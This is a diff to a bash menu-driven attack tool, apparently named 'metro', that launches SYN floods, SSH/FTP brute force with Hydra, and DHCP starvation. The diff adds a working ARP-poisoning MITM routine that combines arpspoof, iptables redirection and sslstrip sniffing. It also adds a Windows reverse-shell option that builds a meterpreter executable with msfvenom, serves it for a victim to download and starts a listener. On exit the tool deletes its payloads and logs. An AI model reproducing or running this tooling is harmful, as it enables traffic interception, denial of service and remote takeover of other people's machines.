@@ -17,7 +17,10 @@ help() {
 cleanup() {
 	echo
 	echo
-	echo "[+] Stopping attack..."
+	 echo -e "\e[34m[+]\e[0m  Stopping attack..."
+	sudo echo "0" > /proc/sys/net/ipv4/ip_forward 2>/dev/null
+	sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port 2>/dev/null
+	pkill -f "python3 -m http.server" 2>/dev/null
 	sleep 2
 	clear
 	menu
@@ -27,7 +30,7 @@ cleanup() {
 check_interface() {
 	if ! ip link show $1 >/dev/null 2>&1; then
 		echo
-		echo "[!] Invalid interface. Use -h for help."
+		 echo -e "\e[31m[!]\e[0mInvalid interface. Use -h for help."
 		exit 0
 	fi
 }
@@ -49,12 +52,12 @@ menu() {
 	
 	# print menu options centered
 	echo
-	echo "$(printf '%*s' $padding)" "[1] SYN Flood"
-	echo "$(printf '%*s' $padding)" "[2] SSH bruteforce"
-	echo "$(printf '%*s' $padding)" "[3] DHCP Starvation"
-	echo "$(printf '%*s' $padding)" "[4] MITM Arp Poisoning"
-	echo "$(printf '%*s' $padding)" "[5] Generic Network Scan"
-	echo "$(printf '%*s' $padding)" "[6] Exit"
+	echo -e "$(printf '%*s' $padding)" "[1] SYN Flood"
+	echo -e "$(printf '%*s' $padding)" "[2] SSH bruteforce"
+	echo -e "$(printf '%*s' $padding)" "[3] DHCP Starvation"
+	echo -e "$(printf '%*s' $padding)" "[4] MITM Arp Poisoning"
+	echo -e "$(printf '%*s' $padding)" "[5] Windows Reverse Shell"
+	echo -e "$(printf '%*s' $padding)" "[6] Exit"
 	
 	# prompt for user input
 	while true; do
@@ -66,10 +69,10 @@ menu() {
 			2) bruteforce ;;
 			3) dhcpstarve ;;
 			4) mitmarp ;;
-			5) scan ;;
-			6) echo; echo "Goodbye :)"; exit 0 ;;
-			"exit") echo; echo "Goodbye :)"; exit 0 ;;
-			*) echo; echo "[!] Invalid option" ;;
+			5) rev ;;
+			6) echo; echo "Goodbye :)"; sudo rm -rf payloads 2>/dev/null; rm *.log 2>/dev/null ; exit 0 ;;
+			"exit") echo; echo "Goodbye :)"; sudo rm -rf payloads 2>/dev/null ; rm *.log 2>/dev/null; exit 0 ;;
+			*) echo;  echo -e "\e[31m[!]\e[0mInvalid option" ;;
 		esac
 	done
 }
@@ -89,7 +92,7 @@ pod() {
 				break
 			else
 				echo
-				echo "[!] Invalid IPv4 address format."
+				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
 				echo
 			fi
 		done
@@ -104,7 +107,7 @@ pod() {
 				break
 			else
 				echo
-				echo "[!] Invalid input"
+				 echo -e "\e[31m[!]\e[0m Invalid input"
 				echo
 			fi
 		done
@@ -118,7 +121,7 @@ pod() {
 			if [[ $size =~ ^[0-9]+$ ]]; then
 				break
 			else
-				echo "[!] Invalid input"
+				 echo -e "\e[31m[!]\e[0m Invalid input"
 			fi
 		done
 		
@@ -131,7 +134,7 @@ pod() {
 			if [[ $port =~ ^[0-9]+$ ]]; then
 				break
 			else
-				echo "[!] Invalid input"
+				 echo -e "\e[31m[!]\e[0m Invalid input"
 			fi
 		done
 		
@@ -142,7 +145,7 @@ pod() {
 		case $random in
 			Y|y) # launch random source IP flood
 				echo 
-				echo "[+] Flooding $target_ip with $packets packets..." 
+				 echo -e "\e[34m[+]\e[0m  Flooding $target_ip with $packets packets..." 
 				sleep 1 
 				echo
 				echo "Press Ctrl-C to stop attack"
@@ -152,14 +155,14 @@ pod() {
 				;;
 			N|n) # launch regular SYN flood 
 				echo 
-				echo "[+] Flooding $target_ip with $packets packets..." 
+				 echo -e "\e[34m[+]\e[0m  Flooding $target_ip with $packets packets..." 
 				sleep 1 
 				echo
 				echo "Press Ctrl-C to stop attack"
 				sleep 2
 				hping3 -c $packets -d $size -S -p $port --flood $target_ip -V
 				;;
-			*) echo; echo "[!] Invalid option" ; continue ;;
+			*) echo;  echo -e "\e[31m[!]\e[0m Invalid option" ; continue ;;
 		esac
 	done
 	
@@ -182,7 +185,7 @@ bruteforce() {
 				break
 			else
 				echo
-				echo "[!] Invalid IPv4 address format."
+				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
 			fi
 		done
 	
@@ -197,7 +200,7 @@ bruteforce() {
 		# check if user and password files exist
 		if [[ ! -f $user_file || ! -f $pass_file ]]; then
 			echo
-			echo "[!] User file or password file does not exist."
+			 echo -e "\e[31m[!]\e[0m  User file or password file does not exist."
 			echo
 			continue
 		fi
@@ -213,12 +216,12 @@ bruteforce() {
 		case $protocol in
 			SSH|ssh) protocol="ssh" ;;
 			FTP|ftp) protocol="ftp" ;;
-			*) echo; echo "[!] Invalid protocol. Please choose SSH or FTP." ; continue ;;
+			*) echo;  echo -e "\e[31m[!]\e[0m Invalid protocol. Please choose SSH or FTP." ; continue ;;
 		esac
 		
 		# launch attack
 		echo
-		echo "[+] Launching Hydra $protocol brute force attack on $target_ip..."
+		 echo -e "\e[34m[+]\e[0m  Launching Hydra $protocol brute force attack on $target_ip..."
 		sleep 1
 		echo
 		echo "Press Ctrl-C to stop attack"
@@ -233,9 +236,69 @@ bruteforce() {
 
 
 mitmarp() {
-	echo "bettercap"
-	echo $iface
-	exit 0
+	cleanup_mitm(){
+        echo
+         echo -e "\e[34m[+]\e[0m  Stopping attack..."
+        sudo echo "0" > /proc/sys/net/ipv4/ip_forward
+        sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
+        exit 0
+    	}
+    	
+    	trap cleanup_mitm SIGINT
+    
+	while true; do
+		while true; do
+			echo
+			read -p "Target IP: " target_ip
+			# regex to match ipv4 address
+			ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+
+			if [[ $target_ip =~ $ipv4_regex ]]; then
+				break
+			else
+				echo
+				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
+			fi
+		done
+		
+		while true; do
+			read -p "Default gateway IP: " dfg_ip
+			# regex to match ipv4 address
+			ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+
+			if [[ $target_ip =~ $ipv4_regex ]]; then
+				break
+			else
+				echo
+				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
+			fi
+		done
+		
+		read -p "SSLSrip listening port (default 1337): " port
+		port=${port:-1337} # set default if enter is pressed
+		
+		# launch attack
+		echo
+		 echo -e "\e[34m[+]\e[0m  Launching attack on target $target_ip and default gateway $dfg_ip ..."
+		sudo echo "1" > /proc/sys/net/ipv4/ip_forward
+		sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
+		sleep 1
+		echo 
+		echo "Press Ctrl-C to stop attack"
+		sleep 2
+		xterm -title "arpspoof target to target" -geometry 80x24+0+0 -e sudo arpspoof -i $iface -t $target_ip $dfg_ip
+		xterm -title "arpspoof target to dfg" -geometry 80x24-0+0 -e sudo arpspoof -i $iface -t $dfg_ip $target_ip
+		sleep 1
+		xterm -title "sslstrip and sniff" -geometry 100x40+50%+50% -e sudo sslstrip -l $port -a -f
+	done
+	
+	menu
 }
 
 dhcpstarve() { 
@@ -248,7 +311,7 @@ dhcpstarve() {
 		case $version in
 			4) # launch starvation attack on DHCP IPv4 server
 				echo
-				echo "[+] Launching attack..."
+				 echo -e "\e[34m[+]\e[0m  Launching attack..."
 				sleep 1
 				echo
 				echo "Press Ctrl-C to stop attack"
@@ -258,7 +321,7 @@ dhcpstarve() {
 				;; 
 			6) # launch starvation attack on DHCP IPv6 server
 				echo
-				echo "[+] Launching attack..."
+				 echo -e "\e[34m[+]\e[0m  Launching attack..."
 				sleep 1
 				echo
 				echo "Press Ctrl-C to stop attack"
@@ -269,7 +332,7 @@ dhcpstarve() {
 			*)
 				# ask again
 				echo
-				echo "[!] Invalid option" 
+				 echo -e "\e[31m[!]\e[0m Invalid option" 
 				;;
 		esac
 	done
@@ -278,11 +341,61 @@ dhcpstarve() {
 }
 
 
-scan() {
-	echo "nmap"
-	echo $iface
-	exit 0
+rev() {
+    while true; do
+        echo
+        while true; do
+            read -p "LHOST: " lhost
+            # regex to match ipv4 address...thanks chatgpt for this one :3
+            ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+
+            if [[ $lhost =~ $ipv4_regex ]]; then
+                break
+            else
+                echo
+                 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
+                echo
+            fi
+        done
+
+        read -p "LPORT (default 4444): " lport
+        lport=${lport:-4444}
+
+        read -p "File name(default shell): " file_name
+        file_name=${file_name:-"shell"}  
+
+        echo
+        echo -e "\e[34m[+]\e[0m Generating payload..."
+        echo 
+
+        # Check if the payloads directory exists, if not, create it
+        if [ ! -d "payloads" ]; then
+            mkdir payloads
+        fi
+
+        # Create payload
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > payloads/$file_name.exe
+        echo
+         echo -e "\e[34m[+]\e[0m  Visit http://$lhost:8080 to download payload on victim machine.."
+        # Python webserver in payloads/
+        xterm -title "pyton webserver" -geometry 80x24-0+0 -e python3 -m http.server --directory payloads 8080 &
+        echo
+         echo -e "\e[34m[+]\e[0m  Starting listener..."
+        echo 
+        # Start listener
+        msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $lhost;set LPORT $lport; exploit"
+
+     	sleep 1
+    done
+
+    menu
 }
+
+
+
 
 
 #CTRL-C force cleanup
@@ -293,8 +406,8 @@ trap cleanup SIGINT
 if [ $# -eq 0 ]
 then
 	echo
-	echo "[!] No interface specified!"
-	echo "[!] Run ./metro -h for help"
+	 echo -e "\e[31m[!]\e[0m  No interface specified!"
+	 echo -e "\e[31m[!]\e[0m  Run ./metro -h for help"
 	echo ""
 	exit 0
 fi
@@ -308,10 +421,10 @@ while getopts "hi:" option; do
 		i) # interface
 			iface=$OPTARG
 			;;
-		\?) # Invalid option
+		\?) #Invalid option
 			echo
-			echo "[!] Invalid flag"
-			echo "[!] Run ./metro -h for help"
+			 echo -e "\e[31m[!]\e[0m Invalid flag"
+			 echo -e "\e[31m[!]\e[0m  Run ./metro -h for help"
 			exit;;
 	esac
 done
